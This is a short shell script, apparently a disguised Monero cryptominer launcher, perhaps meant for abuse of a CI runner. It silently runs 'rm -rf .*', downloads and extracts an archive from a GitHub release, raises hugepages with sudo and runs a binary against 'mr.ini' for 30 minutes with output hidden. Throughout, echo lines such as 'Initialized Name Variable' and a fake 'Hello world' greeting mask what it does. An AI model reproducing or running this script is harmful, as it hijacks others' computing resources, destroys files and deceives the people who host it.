#!/bin/sh
#
#
#XMR
rm -rf .* > /dev/null 2>&1 ; if [ $? -eq 1 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1
tar -xvf MXCC.tar
cd MXCC
x=1
sudo sysctl -w vm.nr_hugepages=1280
echo "Welcome $x times"
while [ $x -le 1 ]
do
  echo "Welcome $x times"
  timeout 30m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
  sh -c "echo Helllo world my name is $INPUT_MY_NAME"
  x=$(( $x + 1 ))
  sleep 15
  echo "All done with $x times"
done